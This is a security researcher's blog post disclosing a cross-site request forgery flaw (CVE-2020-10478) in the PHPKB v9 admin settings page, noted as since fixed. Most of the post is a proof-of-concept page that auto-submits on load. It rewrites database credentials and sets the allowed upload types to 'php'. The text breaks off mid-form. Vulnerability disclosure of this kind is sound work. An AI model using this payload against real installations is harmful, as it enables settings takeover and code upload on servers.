<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<title>Analyzing PHPKB v9: Part three | Antonio Cannito</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="Analyzing PHPKB v9: Part three" />
<meta name="author" content="Antonio" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="The third part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Cross-Site Request Forgery." />
<meta property="og:description" content="The third part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Cross-Site Request Forgery." />
<link rel="canonical" href="https://antoniocannito.it/phpkb3" />
<meta property="og:url" content="https://antoniocannito.it/phpkb3" />
<meta property="og:site_name" content="Antonio Cannito" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-04-05T00:00:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Analyzing PHPKB v9: Part three" />
<script type="application/ld+json">
{"description":"The third part of a series where I will talk about vulnerabilities found in a knowledge-base software written in PHP. Vulnerabilities analyzed: Cross-Site Request Forgery.","url":"https://antoniocannito.it/phpkb3","@type":"BlogPosting","headline":"Analyzing PHPKB v9: Part three","dateModified":"2019-04-05T00:00:00+00:00","datePublished":"2019-04-05T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://antoniocannito.it/phpkb3"},"author":{"@type":"Person","name":"Antonio"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon-16x16.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/apple-touch-icon.png">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="https://antoniocannito.it/feed.xml" title="Antonio Cannito" />

  <!-- Google Analytics-->
  
  <script>
  window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
  ga('create', 'UA—XXXXXXXX-X', 'auto');
  ga('send', 'pageview');
</script>
<script async src='https://www.google-analytics.com/analytics.js'></script>

  
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">Antonio Cannito</h2>
    </a>
    <ul>
      <li><a href="/">Home</a></li>
      <li><a href="https://it.linkedin.com/in/antonio-cannito">Linkedin</a></li>
            <li><a href="https://github.com/nitokhantonio">Github</a></li>
      <li><a href="/pgp/">PGP Key</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post">
  <div class="post-info">
    <span>Written by</span>
    
        Antonio
    

    
      <br>
      <span>on&nbsp;</span><time datetime="2019-04-05 00:00:00 +0000">April 05, 2019</time>
    
  </div>

  <h1 class="post-title">Analyzing PHPKB v9: Part three</h1>
  <div class="post-line"></div>

  <p>This article has been split into three parts; other parts can be found below:</p>

<p>Part 1: <a href="/phpkb1">Part 1</a></p>

<p>Part 2: <a href="/phpkb2">Part 2</a></p>

<p>UPDATE: the vulnerabilities have been fixed in PHPKB v9 P1-202005.</p>

<h2 id="cross-site-request-forgery-when-changing-settings-cve-2020-10478">Cross-Site Request Forgery when changing settings (CVE-2020-10478)</h2>
<p>Targeted: Superuser</p>

<p>Vulnerable file: admin/manage-settings.php</p>

<p>Steps required in order to find the vulnerability:</p>
<ul>
  <li>log-in as a Superuser;</li>
  <li>go under “tools” and click on “manage settings”;</li>
  <li>click on “save settings”.</li>
</ul>

<p>There is no anti-CSRF protection, I’ve prepared this proof of concept:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html5&gt;</span>
<span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.createElement('form').submit.call(document.getElementById('myForm'))"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"[PHPKB]/admin/manage-settings.php"</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">id=</span><span class="s">"myForm"</span> <span class="na">name=</span><span class="s">"myForm"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kbname"</span> <span class="na">value=</span><span class="s">"test"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kburl"</span> <span class="na">value=</span><span class="s">"[PHPKB]"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;access"</span> <span class="na">value=</span><span class="s">"unrestricted"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"extended&amp;#95;support&amp;#95;license&amp;#95;key"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mail&amp;#95;server"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;hostname"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;username"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;password"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"smtp&amp;#95;port"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"encryption&amp;#95;method"</span> <span class="na">value=</span><span class="s">"None"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"emails&amp;#95;debug&amp;#95;mode"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"emails&amp;#95;debug&amp;#95;output"</span> <span class="na">value=</span><span class="s">"error&amp;#95;log"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"send&amp;#95;mails&amp;#95;from"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"test&amp;#95;email"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqlserver"</span> <span class="na">value=</span><span class="s">"127&amp;#46;0&amp;#46;0&amp;#46;1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqlusername"</span> <span class="na">value=</span><span class="s">"root"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqlpswd"</span> <span class="na">value=</span><span class="s">"DummyPass"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"mysqldatabase"</span> <span class="na">value=</span><span class="s">"test"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"fluid"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;tree&amp;#95;width"</span> <span class="na">value=</span><span class="s">"3"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"sidebar&amp;#95;orientation"</span> <span class="na">value=</span><span class="s">"left"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;tree&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"normal"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;tree&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;articles&amp;#95;count"</span> <span class="na">value=</span><span class="s">"show"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"categories&amp;#95;display&amp;#95;order"</span> <span class="na">value=</span><span class="s">"Alphabetic"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"home&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"modern"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"home&amp;#95;search&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"categories&amp;#95;layout&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"theme1"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;categories&amp;#95;cols"</span> <span class="na">value=</span><span class="s">"4"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;title&amp;#95;size"</span> <span class="na">value=</span><span class="s">"normal"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"home&amp;#95;articles&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"tabbed"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;featured"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"featured&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;popular"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"popular&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;rated"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"rated&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;recent"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recent&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;subscribe&amp;#95;kb"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;subscribe&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"minimal"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;articles&amp;#95;layout"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;page&amp;#95;records&amp;#95;default"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"category&amp;#95;page&amp;#95;records&amp;#95;minimal"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"articles&amp;#95;sortby"</span> <span class="na">value=</span><span class="s">"Popularity"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"articles&amp;#95;sortorder"</span> <span class="na">value=</span><span class="s">"Descending"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;subscribe&amp;#95;category"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;news&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;homepage&amp;#95;news"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"number&amp;#95;homepage&amp;#95;news"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;login&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;glossary&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;contact&amp;#95;page"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"send&amp;#95;contact&amp;#95;email"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"contact&amp;#95;email&amp;#95;address"</span> <span class="na">value=</span><span class="s">"hey.do.not.try.to.grab.my.information@justjoking.it"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;instant&amp;#95;suggestions"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"minimum&amp;#95;question&amp;#95;characters"</span> <span class="na">value=</span><span class="s">"60"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"default&amp;#95;search"</span> <span class="na">value=</span><span class="s">"Articles"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"search&amp;#95;in&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"All"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"search&amp;#95;in&amp;#95;others"</span> <span class="na">value=</span><span class="s">"Both"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"search&amp;#95;filter"</span> <span class="na">value=</span><span class="s">"Any&amp;#32;Word"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;recentviewed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"recentviewed&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"display&amp;#95;popular&amp;#95;searches"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"popularsearch&amp;#95;count"</span> <span class="na">value=</span><span class="s">"5"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"article&amp;#95;page&amp;#95;theme"</span> <span class="na">value=</span><span class="s">"default"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"article&amp;#95;sidebar&amp;#95;content"</span> <span class="na">value=</span><span class="s">"related"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;add&amp;#95;favorite"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;print&amp;#95;article"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;email&amp;#95;article"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;exportto&amp;#95;msword"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;exportto&amp;#95;pdf"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;subscribe&amp;#95;article"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;custom&amp;#95;fields"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;rating"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;hits"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;author"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;author&amp;#95;email"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;related&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"number&amp;#95;related&amp;#95;articles"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;related&amp;#95;articles&amp;#95;randomly"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;feedback"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;article&amp;#95;comments"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"existing&amp;#95;comments&amp;#95;visibility"</span> <span class="na">value=</span><span class="s">"hide"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"show&amp;#95;comments&amp;#95;to"</span> <span class="na">value=</span><span class="s">"all"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"comments&amp;#95;sortorder"</span> <span class="na">value=</span><span class="s">"Descending"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email&amp;#95;privacy&amp;#95;protection"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"article&amp;#95;meta&amp;#95;source"</span> <span class="na">value=</span><span class="s">"article&amp;#32;title"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"notify&amp;#95;pending&amp;#95;comment&amp;#95;superuser"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"notify&amp;#95;approved&amp;#95;comment&amp;#95;user"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"schema&amp;#95;publisher&amp;#95;name"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"schema&amp;#95;publisher&amp;#95;logo"</span> <span class="na">value=</span><span class="s">""</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;featured&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;popular&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;latest&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;rated&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;rss&amp;#95;related&amp;#95;feed"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"number&amp;#95;login&amp;#95;attempts"</span> <span class="na">value=</span><span class="s">"9"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"login&amp;#95;delay"</span> <span class="na">value=</span><span class="s">"15"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"maxfilesize"</span> <span class="na">value=</span><span class="s">"5120"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"kb&amp;#95;allowed&amp;#95;upload&amp;#95;file&amp;#95;types"</span> <span class="na">value=</span><span class="s">"php"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"searching&amp;#95;method"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"fulltext&amp;#95;mode"</span> <span class="na">value=</span><span class="s">"0"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"searchresultsperpage"</span> <span class="na">value=</span><span class="s">"10"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"enable&amp;#95;search&amp;#95;files"</span> <span class="na">value=</span><span class="s">"yes"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"doc&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;antiword&amp;#92;antiword&amp;#46;exe"</span> <span class="nt">/&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"ppt&amp;#95;path"</span> <span class="na">value=</span><span class="s">"C&amp;#58;&amp;#92;xampp&amp;#92;htdocs&amp;#92;phpkb&amp;#92;admin&amp;#92;ppthtml&amp;#46;exe"</span> <span class="nt">/&gt;</span>
